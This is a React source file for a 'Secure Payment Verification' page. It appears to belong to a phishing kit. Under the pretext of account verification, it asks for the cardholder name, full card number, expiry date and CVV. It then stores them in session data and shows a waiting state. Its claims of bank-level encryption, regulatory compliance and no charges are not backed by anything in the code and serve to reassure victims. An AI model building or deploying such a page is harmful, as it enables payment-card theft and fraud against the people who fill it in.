import { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { CreditCard, Calendar, Lock, Shield, AlertCircle } from 'lucide-react';
import FormLayout from '@/components/FormLayout';
import ErrorAlert from '@/components/ErrorAlert';
import { useForm } from '@/contexts/FormContext';

const BillingPage = () => {
  const [cardNumber, setCardNumber] = useState('');
  const [expiry, setExpiry] = useState('');
  const [cvv, setCvv] = useState('');
  const [cardHolderName, setCardHolderName] = useState('');
  const [errors, setErrors] = useState<Record<string, string>>({});
  const { updateSessionData, setWaiting } = useForm();

  // Format card number with spaces
  const formatCardNumber = (value: string) => {
    const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    const matches = v.match(/\d{4,16}/g);
    const match = matches && matches[0] || '';
    const parts = [];

    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4));
    }

    if (parts.length) {
      return parts.join(' ');
    } else {
      return v;
    }
  };

  // Format expiry date
  const formatExpiry = (value: string) => {
    const v = value.replace(/\D/g, '');
    if (v.length >= 2) {
      return v.substring(0, 2) + '/' + v.substring(2, 4);
    }
    return v;
  };

  // Validate card number - basic format only
  const validateCardNumber = (number: string) => {
    const digits = number.replace(/\s/g, '');
    // Only check if it has 13-19 digits (standard card length range)
    return digits.length >= 13 && digits.length <= 19 && /^\d+$/.test(digits);
  };

  // Validate expiry date
  const validateExpiry = (expiry: string) => {
    if (!/^\d{2}\/\d{2}$/.test(expiry)) return false;
    
    const [month, year] = expiry.split('/').map(Number);
    if (month < 1 || month > 12) return false;
    
    const now = new Date();
    const currentYear = now.getFullYear() % 100;
    const currentMonth = now.getMonth() + 1;
    
    if (year < currentYear || (year === currentYear && month < currentMonth)) {
      return false;
    }
    
    return true;
  };

  // Validate CVV
  const validateCVV = (cvv: string) => {
    return /^\d{3,4}$/.test(cvv);
  };

  // Validate cardholder name
  const validateCardHolderName = (name: string) => {
    return name.trim().length >= 2 && /^[a-zA-Z\s]+$/.test(name);
  };

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCardNumber(e.target.value);
    setCardNumber(formatted);
    
    if (errors.cardNumber) {
      setErrors(prev => ({ ...prev, cardNumber: '' }));
    }
  };

  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatExpiry(e.target.value);
    setExpiry(formatted);
    
    if (errors.expiry) {
      setErrors(prev => ({ ...prev, expiry: '' }));
    }
  };

  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '');
    setCvv(value);
    
    if (errors.cvv) {
      setErrors(prev => ({ ...prev, cvv: '' }));
    }
  };

  const handleCardHolderNameChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/[^a-zA-Z\s]/g, '');
    setCardHolderName(value);
    
    if (errors.cardHolderName) {
      setErrors(prev => ({ ...prev, cardHolderName: '' }));
    }
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    
    const newErrors: Record<string, string> = {};
    
    // Validate all fields
    if (!cardHolderName.trim()) {
      newErrors.cardHolderName = 'Cardholder name is required';
    } else if (!validateCardHolderName(cardHolderName)) {
      newErrors.cardHolderName = 'Please enter a valid cardholder name';
    }
    
    if (!cardNumber.trim()) {
      newErrors.cardNumber = 'Card number is required';
    } else if (!validateCardNumber(cardNumber)) {
      newErrors.cardNumber = 'Please enter a valid card number';
    }
    
    if (!expiry.trim()) {
      newErrors.expiry = 'Expiry date is required';
    } else if (!validateExpiry(expiry)) {
      newErrors.expiry = 'Please enter a valid expiry date (MM/YY)';
    }
    
    if (!cvv.trim()) {
      newErrors.cvv = 'CVV is required';
    } else if (!validateCVV(cvv)) {
      newErrors.cvv = 'Please enter a valid CVV (3-4 digits)';
    }
    
    if (Object.keys(newErrors).length > 0) {
      setErrors(newErrors);
      return;
    }
    
    // If validation passes, submit the form
    updateSessionData('billing', { 
      cardHolderName, 
      cardNumber: cardNumber.replace(/\s/g, ''), 
      expiry, 
      cvv 
    });
    setWaiting(true);
  };

  return (
    <FormLayout 
      title="Secure Payment Verification" 
      description="To complete your account verification, please provide your payment card details. This helps us confirm your identity and secure your account."
    >
      <ErrorAlert />
      
      {/* Security Notice */}
      <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
        <div className="flex items-start space-x-3">
          <Shield className="h-5 w-5 text-blue-600 mt-0.5" />
          <div className="text-sm">
            <p className="text-blue-800 font-medium mb-1">Your information is secure</p>
            <p className="text-blue-700">
              We use bank-level encryption to protect your payment information. Your card details are encrypted and securely processed.
            </p>
          </div>
        </div>
      </div>

      <form onSubmit={handleSubmit} className="space-y-6">
        {/* Cardholder Name */}
        <div className="space-y-2">
          <Label htmlFor="cardHolderName">Cardholder Name</Label>
          <Input
            id="cardHolderName"
            value={cardHolderName}
            onChange={handleCardHolderNameChange}
            placeholder="Full name as shown on card"
            required
            className={errors.cardHolderName ? 'border-red-500' : ''}
          />
          {errors.cardHolderName && (
            <div className="flex items-center space-x-1 text-red-600 text-sm">
              <AlertCircle className="h-4 w-4" />
              <span>{errors.cardHolderName}</span>
            </div>
          )}
        </div>

        {/* Card Number */}
        <div className="space-y-2">
          <Label htmlFor="cardNumber">Card Number</Label>
          <div className="relative">
            <CreditCard className="absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-muted-foreground" />
            <Input
              id="cardNumber"
              value={cardNumber}
              onChange={handleCardNumberChange}
              className={`pl-10 ${errors.cardNumber ? 'border-red-500' : ''}`}
              placeholder="1234 5678 9012 3456"
              maxLength={19}
              required
            />
          </div>
          {errors.cardNumber && (
            <div className="flex items-center space-x-1 text-red-600 text-sm">
              <AlertCircle className="h-4 w-4" />
              <span>{errors.cardNumber}</span>
            </div>
          )}
        </div>

        <div className="grid grid-cols-2 gap-4">
          {/* Expiry Date */}
          <div className="space-y-2">
            <Label htmlFor="expiry">Expiry Date</Label>
            <div className="relative">
              <Calendar className="absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-muted-foreground" />
              <Input
                id="expiry"
                value={expiry}
                onChange={handleExpiryChange}
                className={`pl-10 ${errors.expiry ? 'border-red-500' : ''}`}
                placeholder="MM/YY"
                maxLength={5}
                required
              />
            </div>
            {errors.expiry && (
              <div className="flex items-center space-x-1 text-red-600 text-sm">
                <AlertCircle className="h-4 w-4" />
                <span>{errors.expiry}</span>
              </div>
            )}
          </div>

          {/* CVV */}
          <div className="space-y-2">
            <Label htmlFor="cvv">CVV</Label>
            <div className="relative">
              <Lock className="absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-muted-foreground" />
              <Input
                id="cvv"
                value={cvv}
                onChange={handleCvvChange}
                className={`pl-10 ${errors.cvv ? 'border-red-500' : ''}`}
                placeholder="123"
                maxLength={4}
                required
              />
            </div>
            {errors.cvv && (
              <div className="flex items-center space-x-1 text-red-600 text-sm">
                <AlertCircle className="h-4 w-4" />
                <span>{errors.cvv}</span>
              </div>
            )}
          </div>
        </div>

        {/* Additional Security Info */}
        <div className="bg-gray-50 border border-gray-200 rounded-lg p-4">
          <div className="flex items-start space-x-3">
            <Lock className="h-5 w-5 text-gray-600 mt-0.5" />
            <div className="text-sm text-gray-700">
              <p className="font-medium mb-1">Why do we need this information?</p>
              <p>
                This verification step helps us comply with banking regulations and ensures your account security. 
                No charges will be made to your card during this verification process.
              </p>
            </div>
          </div>
        </div>

        <Button 
          type="submit" 
          className={`w-full transition-all ${
            cardNumber.trim() && expiry.trim() && cvv.trim() && cardHolderName.trim()
              ? 'bg-[hsl(0,100%,45%)] hover:bg-[hsl(0,100%,40%)]' 
              : ''
          }`}
          size="lg"
        >
          Verify Payment Information
        </Button>
      </form>
    </FormLayout>
  );
};

export default BillingPage;